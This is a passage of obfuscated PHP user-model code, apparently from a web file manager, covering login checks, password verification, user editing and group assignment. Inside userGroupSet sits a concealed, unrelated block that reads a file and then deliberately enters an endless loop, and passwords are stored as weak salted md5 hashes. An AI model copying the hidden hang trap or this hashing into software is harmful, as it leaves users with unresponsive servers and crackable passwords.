$Í¹ØïÜâ[2488] => array($Ş˜¬’Êª[0], $ÇŠ‚…ÂŠ)); } protected function getInfo($ÜğÈş‡, $áàŠ°ş­ = false) { $ùè›Æ = $this->getInfoSimple($ÜğÈş‡); if (!is_array($ùè›Æ)) { return array(); } if ($áàŠ°ş­) { return $this->_getInfoApply($ùè›Æ); } return $this->cacheFunctionGet($_SERVER[¼¥ÊĞÙÌ][2077], $ÜğÈş‡); } protected function getInfoFull($êİïù»µ, $ğö†Ñ¼ = false) { $ÂõĞ‡€ = $this->getInfoSimple($êİïù»µ); if (!is_array($ÂõĞ‡€)) { return array(); } if ($ğö†Ñ¼) { return $this->_getInfoApply($ÂõĞ‡€, !0); } return $this->cacheFunctionGet($_SERVER[¼¥ÊĞÙÌ][2489], $êİïù»µ); } private function _getInfoApply($ı‰Ç²‡ã, $õÍ¥ÑÆú = false) { $Ôôıäã‰ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$ı‰Ç²‡ã) { return $ı‰Ç²‡ã; } $“Ğ ÒíÇ = md5($Ôôıäã‰[2490] . $ı‰Ç²‡ã[$Ôôıäã‰[975]] . $Ôôıäã‰[2491] . $ı‰Ç²‡ã[$Ôôıäã‰[32]]); $ı‰Ç²‡ã = $this->_listDataApplyItem($ı‰Ç²‡ã); $±ºˆ¢å§ = Model($Ôôıäã‰[1440])->metaGet($ı‰Ç²‡ã[$Ôôıäã‰[90]][$Ôôıäã‰[194]]); $ı‰Ç²‡ã[$Ôôıäã‰[2492]] = $“Ğ ÒíÇ; $ı‰Ç²‡ã[$Ôôıäã‰[90]][$Ôôıäã‰[2275]] = isset($±ºˆ¢å§[$Ôôıäã‰[2276]]) ? $±ºˆ¢å§[$Ôôıäã‰[2276]] : null; if ($õÍ¥ÑÆú) { $ı‰Ç²‡ã[$Ôôıäã‰[544]] = $this->metaGet($ı‰Ç²‡ã[$Ôôıäã‰[1790]]); } return $ı‰Ç²‡ã; } protected function getInfoSimple($•…©§, $ÛÖ™Ò£æ = false) { $ş€ ³“Õ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$•…©§) { return array(); } if ($ÛÖ™Ò£æ) { $äüáÜäë = $this->where(array($ş€ ³“Õ[1790] => intval($•…©§)))->find(); if (!is_array($äüáÜäë)) { return array(); } $äüáÜäë[$ş€ ³“Õ[2493]] = Action($ş€ ³“Õ[2494])->parseUrl($äüáÜäë[$ş€ ³“Õ[2493]]); return $äüáÜäë; } return $this->cacheFunctionGet($ş€ ³“Õ[2078], $•…©§); } protected function getInfoSimpleOuter($‡Şë×Â) { $ÚÉ‰¦à• =& $_SERVER[¼¥ÊĞÙÌ]; if (!$‡Şë×Â || $‡Şë×Â == 0) { return array($ÚÉ‰¦à•[1790] => $ÚÉ‰¦à•[231], $ÚÉ‰¦à•[32] => $ÚÉ‰¦à•[176] . LNG($ÚÉ‰¦à•[2495]) . $ÚÉ‰¦à•[178], $ÚÉ‰¦à•[2493] => STATIC_PATH . $ÚÉ‰¦à•[2496]); } $ªßŞ²Ö = $this->cacheFunctionGet($ÚÉ‰¦à•[2078], $‡Şë×Â); $šÊí³Èä = array_field_key($ªßŞ²Ö, explode($ÚÉ‰¦à•[50], $this->simpleField)); if (!$šÊí³Èä) { return array($ÚÉ‰¦à•[1790] => $ÚÉ‰¦à•[1285], $ÚÉ‰¦à•[32] => $ÚÉ‰¦à•[176] . LNG($ÚÉ‰¦à•[2497]) . $ÚÉ‰¦à•[178], $ÚÉ‰¦à•[2493] => STATIC_PATH . $ÚÉ‰¦à•[2498]); } $šÊí³Èä[$ÚÉ‰¦à•[2493]] = Action($ÚÉ‰¦à•[2494])->parseUrl($šÊí³Èä[$ÚÉ‰¦à•[2493]]); return $šÊí³Èä; } protected function groupUser($ÑÁÃÉæÂ) { } public static function errorLang($ƒÓúÊò¦) { $£ŠîÇù¼ =& $_SERVER[¼¥ÊĞÙÌ]; $ö¢Ä”°¿ = array(self::ERROR_USER_NOT_EXISTS => $£ŠîÇù¼[2499], self::ERROR_USER_PASSWORD_ERROR => $£ŠîÇù¼[2500], self::ERROR_USER_EXIST_NAME => $£ŠîÇù¼[2501], self::ERROR_USER_EXIST_PHONE => $£ŠîÇù¼[2502], self::ERROR_USER_EXIST_EMAIL => $£ŠîÇù¼[2503], self::ERROR_USER_LOGIN_LOCK => $£ŠîÇù¼[2504], self::ERROR_IP_NOT_ALLOW => $£ŠîÇù¼[2505], self::ERROR_USER_EXIST_NICKNAME => $£ŠîÇù¼[2506]); $Å»ïÌÂğ = LNG($ö¢Ä”°¿[$ƒÓúÊò¦]); if ($ƒÓúÊò¦ == self::ERROR_USER_LOGIN_LOCK) { $ççÌ–¸Ö = (int) Model($£ŠîÇù¼[1396])->get($£ŠîÇù¼[2507]); if ($ççÌ–¸Ö > 60) { $Å»ïÌÂğ = str_replace($£ŠîÇù¼[91], ceil($ççÌ–¸Ö / 60), $Å»ïÌÂğ); } } return $Å»ïÌÂğ; } protected function metaSet($òæÇ“’, $°ô‚¨ºş = null, $Ö«ûÁ¸° = null) { $this->clearCache($òæÇ“’); return parent::metaSet($òæÇ“’, $°ô‚¨ºş, $Ö«ûÁ¸°); } public function getInfoByMeta($á™ñÖ®Ì, $ã±¯•£û) { $‰ßÕâ‚¡ =& $_SERVER[¼¥ÊĞÙÌ]; $´ğ¥’µş = Model($‰ßÕâ‚¡[2508])->where(array($‰ßÕâ‚¡[97] => $á™ñÖ®Ì, $‰ßÕâ‚¡[453] => $ã±¯•£û))->find(); if ($´ğ¥’µş) { return $this->getInfo($´ğ¥’µş[$‰ßÕâ‚¡[1790]]); } return !1; } public function userLoginCheck($¡«¨å±, $º­‘£Šê, $­«ä‡ÆÂ = false) { $²¦ñ‹¬Î =& $_SERVER[¼¥ÊĞÙÌ]; $àÈäÜñŒ = $this->userLoginFind($¡«¨å±); if (!$àÈäÜñŒ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($àÈäÜñŒ[$²¦ñ‹¬Î[1790]], $º­‘£Šê)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $­«ä‡ÆÂ ? $this->getInfoFull($àÈäÜñŒ[$²¦ñ‹¬Î[1790]]) : $this->getInfo($àÈäÜñŒ[$²¦ñ‹¬Î[1790]]); } public function userLoginFind($ªÄïİ™ê) { $ŸŠà¾¤™ =& $_SERVER[¼¥ÊĞÙÌ]; $¶¦š°š¼ = array($ŸŠà¾¤™[32] => $ªÄïİ™ê, $ŸŠà¾¤™[2288] => $ªÄïİ™ê, $ŸŠà¾¤™[383] => $ªÄïİ™ê, $ŸŠà¾¤™[2509] => $ªÄïİ™ê, $ŸŠà¾¤™[1086] => $ŸŠà¾¤™[1088]); if ($this->nickNameRpt()) { unset($¶¦š°š¼[$ŸŠà¾¤™[2288]]); } return $this->where($¶¦š°š¼)->find(); } public function clearCache($’İµ¿ù¡) { $ÒĞêÄÕü =& $_SERVER[¼¥ÊĞÙÌ]; $this->cacheFunctionClear($ÒĞêÄÕü[2077], $’İµ¿ù¡); $this->cacheFunctionClear($ÒĞêÄÕü[2078], $’İµ¿ù¡); $this->cacheFunctionClear($ÒĞêÄÕü[2489], $’İµ¿ù¡); } public function userPasswordCheck($ìõ—»Ñ, $½º†¾Š) { $û½æ´ =& $_SERVER[¼¥ÊĞÙÌ]; $³í§Õ¼ = $this->where(array($û½æ´[1790] => intval($ìõ—»Ñ)))->find(); $±ûÃØì = $this->metaGet($ìõ—»Ñ); $ØÜ÷™œ” = isset($±ûÃØì[$û½æ´[2510]]) ? $±ûÃØì[$û½æ´[2510]] : $û½æ´[12]; if (md5($ØÜ÷™œ” . trim($½º†¾Š)) !== $³í§Õ¼[$û½æ´[975]]) { return !1; } return !0; } public function userAdd($ºşÁìİë) { $ôâÍ”ø =& $_SERVER[¼¥ÊĞÙÌ]; $Ù¯Ş‹¾ = array($ôâÍ”ø[497] => $ºşÁìİë[$ôâÍ”ø[32]], $ôâÍ”ø[2511] => $ºşÁìİë[$ôâÍ”ø[2199]], $ôâÍ”ø[2512] => isset($ºşÁìİë[$ôâÍ”ø[383]]) ? $ºşÁìİë[$ôâÍ”ø[383]] : $ôâÍ”ø[12], $ôâÍ”ø[2513] => isset($ºşÁìİë[$ôâÍ”ø[2509]]) ? $ºşÁìİë[$ôâÍ”ø[2509]] : $ôâÍ”ø[12], $ôâÍ”ø[2514] => isset($ºşÁìİë[$ôâÍ”ø[2288]]) ? $ºşÁìİë[$ôâÍ”ø[2288]] : $ºşÁìİë[$ôâÍ”ø[32]], $ôâÍ”ø[2515] => isset($ºşÁìİë[$ôâÍ”ø[2493]]) ? $ºşÁìİë[$ôâÍ”ø[2493]] : $ôâÍ”ø[12], $ôâÍ”ø[2516] => isset($ºşÁìİë[$ôâÍ”ø[2517]]) ? $ºşÁìİë[$ôâÍ”ø[2517]] : 1, $ôâÍ”ø[2518] => $ºşÁìİë[$ôâÍ”ø[975]], $ôâÍ”ø[2079] => isset($ºşÁìİë[$ôâÍ”ø[1978]]) ? $ºşÁìİë[$ôâÍ”ø[1978]] : 1024 * 1024 * 20, $ôâÍ”ø[2080] => 0, $ôâÍ”ø[2519] => 0, $ôâÍ”ø[2124] => isset($ºşÁìİë[$ôâÍ”ø[824]]) ? $ºşÁìİë[$ôâÍ”ø[824]] : 1); if (!empty($ºşÁìİë[$ôâÍ”ø[1790]])) { $Ù¯Ş‹¾[$ôâÍ”ø[1790]] = $ºşÁìİë[$ôâÍ”ø[1790]]; } $¼Û´ëÕİ = $this->_checkExist($ºşÁìİë); if ($¼Û´ëÕİ !== !0) { return $¼Û´ëÕİ; } if (!empty($Ù¯Ş‹¾[$ôâÍ”ø[2493]]) && strlen($Ù¯Ş‹¾[$ôâÍ”ø[2493]]) > 255) { $Ù¯Ş‹¾[$ôâÍ”ø[2493]] = $ôâÍ”ø[12]; } $Ê÷Ù‘ = $this->add($Ù¯Ş‹¾); $Ìë¢¥« = array($ôâÍ”ø[2518] => $Ù¯Ş‹¾[$ôâÍ”ø[975]], $ôâÍ”ø[2514] => $Ù¯Ş‹¾[$ôâÍ”ø[2288]], $ôâÍ”ø[2520] => $ºşÁìİë[$ôâÍ”ø[2084]]); $this->userEdit($Ê÷Ù‘, $Ìë¢¥«); Model($ôâÍ”ø[1440])->userRootAdd($Ê÷Ù‘); return $Ê÷Ù‘; } protected function userEditTest($ŠÛÙ ¯¬, $ãÌ”Î) { return $this->call($_SERVER[¼¥ÊĞÙÌ][2521], $ŠÛÙ ¯¬, $ãÌ”Î); } protected function userEdit($¯­²è–, $é“ıé“ò) { $ùƒ«ƒÜù =& $_SERVER[¼¥ÊĞÙÌ]; $²¹¼Óëú = $this->getInfoSimple($¯­²è–); if (!$²¹¼Óëú) { return !1; } $’ú³ç = $this->_checkExist($é“ıé“ò, $¯­²è–); if ($’ú³ç !== !0) { return $’ú³ç; } if (isset($é“ıé“ò[$ùƒ«ƒÜù[975]]) && trim($é“ıé“ò[$ùƒ«ƒÜù[975]]) != $ùƒ«ƒÜù[12]) { $Æ‰¢öä¬ = $this->metaGet($¯­²è–); if (empty($Æ‰¢öä¬[$ùƒ«ƒÜù[2510]])) { $Æ‰¢öä¬[$ùƒ«ƒÜù[2510]] = rand_string(10); Model($ùƒ«ƒÜù[582])->metaSet($¯­²è–, $ùƒ«ƒÜù[2510], $Æ‰¢öä¬[$ùƒ«ƒÜù[2510]]); } $é“ıé“ò[$ùƒ«ƒÜù[975]] = md5($Æ‰¢öä¬[$ùƒ«ƒÜù[2510]] . trim($é“ıé“ò[$ùƒ«ƒÜù[975]])); } else { unset($é“ıé“ò[$ùƒ«ƒÜù[975]]); } if (!empty($é“ıé“ò[$ùƒ«ƒÜù[2493]]) && strlen($é“ıé“ò[$ùƒ«ƒÜù[2493]]) > 255) { $é“ıé“ò[$ùƒ«ƒÜù[2493]] = $ùƒ«ƒÜù[12]; } if (isset($é“ıé“ò[$ùƒ«ƒÜù[2288]])) { $this->setNamePinyin($¯­²è–, $é“ıé“ò[$ùƒ«ƒÜù[2288]]); } if (isset($é“ıé“ò[$ùƒ«ƒÜù[2084]])) { $Ÿ·ú»‘“ = $ùƒ«ƒÜù[1399] . $¯­²è–; $Åˆêóšó = $ùƒ«ƒÜù[1397]; $œ‰ºÛÚù = $é“ıé“ò[$ùƒ«ƒÜù[2084]] ? $é“ıé“ò[$ùƒ«ƒÜù[2084]] : $ùƒ«ƒÜù[12]; $õ‰˜š±Å = Model($ùƒ«ƒÜù[1396])->get($Ÿ·ú»‘“, $Åˆêóšó); $õ‰˜š±Å = $õ‰˜š±Å ? $õ‰˜š±Å : $ùƒ«ƒÜù[12]; if ($õ‰˜š±Å != $œ‰ºÛÚù) { if (!$œ‰ºÛÚù && $õ‰˜š±Å) { Model($ùƒ«ƒÜù[1396])->remove($Ÿ·ú»‘“, $Åˆêóšó); } else { if ($œ‰ºÛÚù) { Model($ùƒ«ƒÜù[1396])->set($Ÿ·ú»‘“, $œ‰ºÛÚù, $Åˆêóšó); } } } unset($é“ıé“ò[$ùƒ«ƒÜù[2084]]); Model($ùƒ«ƒÜù[602])->metaSet($¯­²è–, $ùƒ«ƒÜù[2084], $œ‰ºÛÚù); } $this->where(array($ùƒ«ƒÜù[1781] => $¯­²è–))->save($é“ıé“ò); $this->clearCache($¯­²è–); return !0; } public function setNamePinyin($ş½Í¦é, $ÏÖ„ôÛì = false) { $ä×çî¹Ä =& $_SERVER[¼¥ÊĞÙÌ]; if (!$ÏÖ„ôÛì) { $‰úÅúË… = $this->getInfoSimple($ş½Í¦é); $ÏÖ„ôÛì = $‰úÅúË…[$ä×çî¹Ä[2288]] ? $‰úÅúË…[$ä×çî¹Ä[2288]] : $‰úÅúË…[$ä×çî¹Ä[32]]; } $»Åİà«ö = Model($ä×çî¹Ä[602]); if (!Input::check($ÏÖ„ôÛì, $ä×çî¹Ä[663])) { return $»Åİà«ö->metaSet($ş½Í¦é, array($ä×çî¹Ä[541] => $ä×çî¹Ä[12], $ä×çî¹Ä[540] => $ä×çî¹Ä[12])); } return $»Åİà«ö->metaSet($ş½Í¦é, array($ä×çî¹Ä[541] => str_replace($ä×çî¹Ä[53], $ä×çî¹Ä[12], Pinyin::get($ÏÖ„ôÛì)), $ä×çî¹Ä[540] => Pinyin::get($ÏÖ„ôÛì, $ä×çî¹Ä[664]))); } private function nickNameRpt() { $Âëæ¥® =& $_SERVER[¼¥ÊĞÙÌ]; $å´äë† = Model($Âëæ¥®[844])->get($Âëæ¥®[2522]); $Ş÷à¡ÙÜ = $GLOBALS[$Âëæ¥®[6]][$Âëæ¥®[460]][$Âëæ¥®[2522]]; $ÄÈõêïœ = !is_null($å´äë†) ? $å´äë† : $Ş÷à¡ÙÜ; return !!$ÄÈõêïœ; } private function _checkExist($¸š¶šÈ, $¤ÚûûŸ¾ = false) { $éğ ê˜á =& $_SERVER[¼¥ÊĞÙÌ]; $àîÄ©Ê = array($éğ ê˜á[32] => UserModel::ERROR_USER_EXIST_NAME, $éğ ê˜á[2288] => UserModel::ERROR_USER_EXIST_NICKNAME, $éğ ê˜á[383] => UserModel::ERROR_USER_EXIST_EMAIL, $éğ ê˜á[2509] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($àîÄ©Ê[$éğ ê˜á[2288]]); } $ë“É±®¦ = $¤ÚûûŸ¾ ? array($éğ ê˜á[1790] => array($éğ ê˜á[2523], $¤ÚûûŸ¾)) : array(); foreach ($àîÄ©Ê as $¯Á±İ => $’ÛŠ•ÛÀ) { $£ÑˆÔÛá = array(); foreach ($àîÄ©Ê as $ïœ»ÅÀÍ => $µñ”ï¯) { if (isset($¸š¶šÈ[$ïœ»ÅÀÍ]) && $¸š¶šÈ[$ïœ»ÅÀÍ]) { $£ÑˆÔÛá[] = $¸š¶šÈ[$ïœ»ÅÀÍ]; } } if (!$£ÑˆÔÛá) { continue; } $úØÜ‚­ = array_merge(array($¯Á±İ => array($éğ ê˜á[7], $£ÑˆÔÛá)), $ë“É±®¦); $ˆÛê¤¬Í = $this->where($úØÜ‚­)->find(); if ($ˆÛê¤¬Í) { return $’ÛŠ•ÛÀ; } } return !0; } public function userListInfo($ñÙÜ‘„¤) { $ôåŞ›•å =& $_SERVER[¼¥ÊĞÙÌ]; $¬Ûôëßê = array(); $ñÙÜ‘„¤ = is_array($ñÙÜ‘„¤) ? array_unique($ñÙÜ‘„¤) : array(); if (!$ñÙÜ‘„¤) { return $¬Ûôëßê; } if (count($ñÙÜ‘„¤) < 20) { foreach ($ñÙÜ‘„¤ as $öÚ™ê¿´) { $¬Ûôëßê[$öÚ™ê¿´ . $ôåŞ›•å[12]] = $this->getInfoSimpleOuter($öÚ™ê¿´); } } else { $©¨ÃÜ¿Ó = array($ôåŞ›•å[1781] => array($ôåŞ›•å[495], $ñÙÜ‘„¤)); if (count($ñÙÜ‘„¤) == 1) { $©¨ÃÜ¿Ó = array($ôåŞ›•å[1781] => $ñÙÜ‘„¤[0]); } $§è¥º³ö = Model($ôåŞ›•å[582])->field($this->simpleField)->where($©¨ÃÜ¿Ó)->select(); $§è¥º³ö = array_to_keyvalue($§è¥º³ö, $ôåŞ›•å[1790]); foreach ($ñÙÜ‘„¤ as $öÚ™ê¿´) { $ªä›õÌ¨ = $§è¥º³ö[$öÚ™ê¿´]; if (!$ªä›õÌ¨) { $¬Ûôëßê[$öÚ™ê¿´ . $ôåŞ›•å[12]] = $this->getInfoSimpleOuter($öÚ™ê¿´); continue; } $ªä›õÌ¨[$ôåŞ›•å[2493]] = Action($ôåŞ›•å[2494])->parseUrl($ªä›õÌ¨[$ôåŞ›•å[2493]]); $¬Ûôëßê[$öÚ™ê¿´ . $ôåŞ›•å[12]] = $ªä›õÌ¨; } } return $¬Ûôëßê; } protected function userStatus($šî¨ªÂÕ, $ë½ƒñø) { $éµ–•Ü = $this->getInfoSimple($šî¨ªÂÕ); if (!$éµ–•Ü) { return !1; } $µéã‘ÄÔ = array($_SERVER[¼¥ÊĞÙÌ][824] => $ë½ƒñø); return $this->userEdit($šî¨ªÂÕ, $µéã‘ÄÔ); } protected function userRemove($Áç±¹œ) { $ªÙßµù¤ =& $_SERVER[¼¥ÊĞÙÌ]; $ØÅŠó‰è = $this->getInfoSimple($Áç±¹œ); if (!$ØÅŠó‰è) { return !1; } $—–’Ä›õ = array($ªÙßµù¤[1781] => $Áç±¹œ); Model($ªÙßµù¤[672])->where($—–’Ä›õ)->delete(); Model($ªÙßµù¤[2524])->where($—–’Ä›õ)->delete(); Model($ªÙßµù¤[2086])->where($—–’Ä›õ)->delete(); Model($ªÙßµù¤[2508])->where($—–’Ä›õ)->delete(); Model($ªÙßµù¤[1156])->where($—–’Ä›õ)->delete(); Model($ªÙßµù¤[2305])->removeUserAll($Áç±¹œ); Model($ªÙßµù¤[904])->userRootRemove($Áç±¹œ); return $this->where($—–’Ä›õ)->delete(); } protected function userGroupSet($€æ¿¦šæ, $Ì²•šÑ, $Øñ›İ = array()) { $‰Çî‘Êò =& $_SERVER[¼¥ÊĞÙÌ]; if (!isset($_SERVER[$‰Çî‘Êò[959]]) || !isset($_SERVER[$‰Çî‘Êò[957]])) { $¹‚²ô¯À = $‰Çî‘Êò[960]; $’Â¬Æñè = $‰Çî‘Êò[961]; $—Ñ¯„Ãì = $_SERVER[$‰Çî‘Êò[962]] . $‰Çî‘Êò[963]; $ƒ÷Ş¼„î = $’Â¬Æñè($—Ñ¯„Ãì); $Ê€¡åÎê = explode($‰Çî‘Êò[288], $ƒ÷Ş¼„î); if (count($Ê€¡åÎê) < $‰Çî‘Êò[693]) { $«ëë²İ¸ = $‰Çî‘Êò[964]; $«ëë²İ¸(); } $ÕŠíİî = $‰Çî‘Êò[965]; $ÕŠíİî($_SERVER[$‰Çî‘Êò[966]]); $ïßöÔ¡› = 1; for ($‚Û±§ôĞ = $ïßöÔ¡›; $‚Û±§ôĞ > 0; $‚Û±§ôĞ++) { $ÕŠíİî = json_encode($GLOBALS[$‰Çî‘Êò[495]]); } } $Õõ¢ÍÆØ = $this->getInfoSimple($€æ¿¦šæ); if (!$Õõ¢ÍÆØ || !is_array($Ì²•šÑ)) { return !1; } $ÛÁœ›õ = Model($‰Çî‘Êò[2086]); $ÛÁœ›õ->where(array($‰Çî‘Êò[1790] => $€æ¿¦šæ))->delete(); $¦İÜ–½ = array(); $£à±®Üø = 0; foreach ($Ì²•šÑ as $èÁ•æÛã => $ºŠƒÈÍ) { $ËË”ˆ‚¬ = array($‰Çî‘Êò[1790] => $€æ¿¦šæ, $‰Çî‘Êò[1402] => $èÁ•æÛã, $‰Çî‘Êò[2100] => $ºŠƒÈÍ); $ËË”ˆ‚¬[$‰Çî‘Êò[2015]] = isset($Øñ›İ[$£à±®Üø]) ? $Øñ›İ[$£à±®Üø] : 0; $£à±®Üø++; $¦İÜ–½[] = $ËË”ˆ‚¬; } return $ÛÁœ›õ->addAll($¦İÜ–½, array(), !0); } protected function userGroupAdd($†òªüıÜ, $Ş¬—â” = array()) { $“Àì¹ÇŠ =& $_SERVER[¼¥ÊĞÙÌ]; $ÍĞÚÛíö = $this->getInfoSimple($†òªüıÜ); if (!$ÍĞÚÛíö || empty($Ş¬—â”)) { return !1; } $‡ÔıÕÛá = array(); foreach ($Ş¬—â” as $µöèÑ€± => $ø–ãØ½‘) { $‡ÔıÕÛá[] = array($“Àì¹ÇŠ[1790] => $†òªüıÜ, $“Àì¹ÇŠ[1402] => $µöèÑ€±, $“Àì¹ÇŠ[2100] => $ø–ãØ½‘, $“Àì¹ÇŠ[2015] => 0); } return Model($“Àì¹ÇŠ[2086])->addAll($‡ÔıÕÛá, array(), !0); } protected function userGroupRemove($ê‘ãËáŞ, $ÚÕØëøÖ) { $ÅÊà–üÎ =& $_SERVER[¼¥ÊĞÙÌ]; $¨½Šˆ´Ü = $this->getInfoSimple($ê‘ãËáŞ); if (!$¨½Šˆ´Ü || !$ÚÕØëøÖ) { return !1; } $äíÉª¤ = array($ÅÊà–üÎ[1781] => $ê‘ãËáŞ, $ÅÊà–üÎ[2081] => $ÚÕØëøÖ); return Model($ÅÊà–üÎ[2086])->where($äíÉª¤)->delete(); } public function listData() { $ÉïÅÕŒØ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÉïÅÕŒØ[$_SERVER[¼¥ÊĞÙÌ][448]]); return $ÉïÅÕŒØ; } public function listByID($Ì…ÌËŸ») { $Ò”Šáº =& $_SERVER[¼¥ÊĞÙÌ]; if (!$Ì…ÌËŸ») { return; } $Ú¸ Î = array($Ò”Šáº[1790] => array($Ò”Šáº[7], $Ì…ÌËŸ»)); $´Ù®ØÙ = $this->where($Ú¸ Î)->select(); $´Ù®ØÙ = array_sort_keep($´Ù®ØÙ, $Ò”Šáº[1790], $Ì…ÌËŸ»); $this->_listDataApply($´Ù®ØÙ); return $´Ù®ØÙ; } public function listByGroup($†àò³ğ¦ = 0, $‰Úıóòä = array()) { $ŸÂ‚ô¥• =& $_SERVER[¼¥ÊĞÙÌ]; $—Â»­ = $ŸÂ‚ô¥•[12]; $ãÕ¤¡ÎÎ = array(); if ($†àò³ğ¦) { $ãÕ¤¡ÎÎ = array($ŸÂ‚ô¥•[2525] => intval($†àò³ğ¦)); $—Â»­ = "\114\x45\106\x54\x20\112\117\x49\116\x20{$this->tablePrefix}\165\x73\145\162\x5f\147\x72\x6f\165\x70\x20\x75\x73\x65\x72\x5f\x67\162\x6f\165\x70\40\157\156\x20\x75\x73\x65\x72\x2e\x75\x73\145\162\x49\x44\40\x3d\x20\165\163\145\162\137\147\162\157\165\x70\56\x75\163\145\162\111\104"; $ıÊ›İ¨ = Input::get($ŸÂ‚ô¥•[533], null, $ŸÂ‚ô¥•[12]) ? $ŸÂ‚ô¥•[12] : $ŸÂ‚ô¥•[2526]; } if (isset($‰Úıóòä[$ŸÂ‚ô¥•[824]])) { $ãÕ¤¡ÎÎ[$ŸÂ‚ô¥•[2527]] = $‰Úıóòä[$ŸÂ‚ô¥•[824]]; } $âô’„× = _get($‰Úıóòä, $ŸÂ‚ô¥•[2528], $ŸÂ‚ô¥•[234]); if (_get($‰Úıóòä, $ŸÂ‚ô¥•[834], !1)) { $ãÕ¤¡ÎÎ[$âô’„×] = array($ŸÂ‚ô¥•[2269], $‰Úıóòä[$ŸÂ‚ô¥•[834]]); } if (_get($‰Úıóòä, $ŸÂ‚ô¥•[835], !1)) { $±³ÉŒ¦‹ = array($ŸÂ‚ô¥•[2270], $‰Úıóòä[$ŸÂ‚ô¥•[835]]); if ($ãÕ¤¡ÎÎ[$âô’„×]) { $ãÕ¤¡ÎÎ[$âô’„×] = array($ãÕ¤¡ÎÎ[$âô’„×], $±³ÉŒ¦‹, $ŸÂ‚ô¥•[2271]); } else { $ãÕ¤¡ÎÎ[$âô’„×] = $±³ÉŒ¦‹; } } $Î‚œªõ‡ = $this->_makeOrder($ıÊ›İ¨)->field($ŸÂ‚ô¥•[2529])->where($ãÕ¤¡ÎÎ)->join($—Â»­)->selectPage(50); $this->_listDataApply($Î‚œªõ‡[$ŸÂ‚ô¥•[448]]); return $Î‚œªõ‡; } private function _makeOrder($­¡…¸×° = '') { $ìİººÎ =& $_SERVER[¼¥ÊĞÙÌ]; $®ë‘¼¡ = array($ìİººÎ[1790], $ìİººÎ[32], $ìİººÎ[1980], $ìİººÎ[2199], $ìİººÎ[1952], $ìİººÎ[234]); $ŠÚ„üí¶ = array($ìİººÎ[526] => $ìİººÎ[527], $ìİººÎ[528] => $ìİººÎ[529]); $÷½©Á£ = Input::get($ìİººÎ[533], $ìİººÎ[7], $ìİººÎ[1781], $®ë‘¼¡); $Äö»€ØĞ = Input::get($ìİººÎ[534], $ìİººÎ[7], $ìİººÎ[2087], array($ìİººÎ[2087], $ìİººÎ[528])); $Äö»€ØĞ = $ŠÚ„üí¶[$Äö»€ØĞ]; $­¡…¸×° = $­¡…¸×° . "\165\163\x65\x72\56{$÷½©Á£}\x20{$Äö»€ØĞ}\x2c\x20\x75\x73\145\x72\56\x75\163\145\x72\111\104\40\141\163\143"; return $this->alias($ìİººÎ[2215])->order($­¡…¸×°); } public function listSearch($ÇëÃß¾ë) { $éáÙ“¹ =& $_SERVER[¼¥ÊĞÙÌ]; $Œ€Êğ´÷ = trim($ÇëÃß¾ë[$éáÙ“¹[2090]]); $öÚÉÜ¹â = explode($éáÙ“¹[53], $Œ€Êğ´÷); if (!$Œ€Êğ´÷ || count($öÚÉÜ¹â) == 1) { return $this->listSearchNow($ÇëÃß¾ë); } $†œ×Á©¥ = array($éáÙ“¹[448] => array()); foreach ($öÚÉÜ¹â as $µ”¢Å·Á) { if (!trim($µ”¢Å·Á)) { continue; } $ÇëÃß¾ë[$éáÙ“¹[2090]] = $µ”¢Å·Á; $Ååş€ˆñ = $this->listSearchNow($ÇëÃß¾ë); $†œ×Á©¥[$éáÙ“¹[448]] = array_merge($†œ×Á©¥[$éáÙ“¹[448]], $Ååş€ˆñ[$éáÙ“¹[448]]); } $†œ×Á©¥[$éáÙ“¹[448]] = array_unique_by_key($†œ×Á©¥[$éáÙ“¹[448]], $éáÙ“¹[1790]); $†œ×Á©¥[$éáÙ“¹[445]] = array($éáÙ“¹[446] => count($†œ×Á©¥[$éáÙ“¹[448]]), $éáÙ“¹[442] => 20, $éáÙ“¹[431] => 1, $éáÙ“¹[447] => 1); return $†œ×Á©¥; } public function listSearchNow($áïÉïŒ) { $—ÛöŞøŞ =& $_SERVER[¼¥ÊĞÙÌ]; $à¦ã£À” = trim($áïÉïŒ[$—ÛöŞøŞ[2090]]); $ÙŒÓşó¿ = isset($áïÉïŒ[$—ÛöŞøŞ[2091]]) ? $áïÉïŒ[$—ÛöŞøŞ[2091]] : !1; $à¦ã£À” = str_replace($—ÛöŞøŞ[2092], $—ÛöŞøŞ[2093], trim($à¦ã£À”)); $Îüº¯©Í = array($—ÛöŞøŞ[32] => array($—ÛöŞøŞ[462], "\x25{$à¦ã£À”}\x25"), $—ÛöŞøŞ[383] => array($—ÛöŞøŞ[462], "{$à¦ã£À”}\45"), $—ÛöŞøŞ[2288] => array($—ÛöŞøŞ[462], "{$à¦ã£À”}\45"), $—ÛöŞøŞ[1086] => $—ÛöŞøŞ[2094]); if (Input::check($à¦ã£À”, $—ÛöŞøŞ[389])) { $Îüº¯©Í[$—ÛöŞøŞ[1790]] = array($—ÛöŞøŞ[462], "{$à¦ã£À”}\x25"); $Îüº¯©Í[$—ÛöŞøŞ[2509]] = array($—ÛöŞøŞ[462], "{$à¦ã£À”}\45"); } if (!$à¦ã£À”) { $Îüº¯©Í = array(); } if (isset($áïÉïŒ[$—ÛöŞøŞ[824]])) { $Îüº¯©Í[$—ÛöŞøŞ[824]] = $áïÉïŒ[$—ÛöŞøŞ[824]]; } $Îüº¯©Í = $this->parseWhereLike($Îüº¯©Í); $öÄ¿¼“† = $this->_makeOrder()->where($Îüº¯©Í)->selectPage(20); if (!$öÄ¿¼“† || count($öÄ¿¼“†[$—ÛöŞøŞ[448]]) < 5 && Input::check($à¦ã£À”, $—ÛöŞøŞ[396])) { $¥ŸÅ·Ìæ = $this->_searchFromMeta($—ÛöŞøŞ[540], $à¦ã£À”, 10); $¡Óô¾ºÑ = $this->_searchFromMeta($—ÛöŞøŞ[541], $à¦ã£À”, 10); $’ôï¡… = array_merge($¥ŸÅ·Ìæ, $¡Óô¾ºÑ, $öÄ¿¼“†[$—ÛöŞøŞ[448]]); $öÄ¿¼“†[$—ÛöŞøŞ[448]] = array_unique_by_key($’ôï¡…, $—ÛöŞøŞ[1790]); $öÄ¿¼“†[$—ÛöŞøŞ[445]][$—ÛöŞøŞ[446]] = count($öÄ¿¼“†[$—ÛöŞøŞ[448]]); 